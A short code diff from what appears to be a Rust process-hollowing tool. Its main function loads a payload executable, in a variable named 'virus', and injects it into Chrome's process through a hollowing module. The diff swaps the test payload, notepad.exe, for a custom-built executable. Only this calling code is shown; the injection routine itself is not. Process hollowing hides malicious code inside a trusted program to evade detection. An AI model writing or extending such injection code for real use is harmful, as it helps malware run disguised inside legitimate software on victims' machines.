@@ -37,8 +37,8 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let _ = out.mkdir();
 
     let chrome = Path::new("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
-    let virus = Path::new("C:\\Windows\\System32\\notepad.exe");
-    // let virus = Path::new("D:\\Projetcs\\rust\\temp\\target\\release\\temp.exe");
+    // let virus = Path::new("C:\\Windows\\System32\\notepad.exe");
+    let virus = Path::new("D:\\Projetcs\\rust\\temp\\target\\release\\temp.exe");
     let (payload, size) = hollowing::get_payload_buffer(virus.deref()).unwrap();
 
     assert!(hollowing::hollow(&chrome, payload, size).is_some());
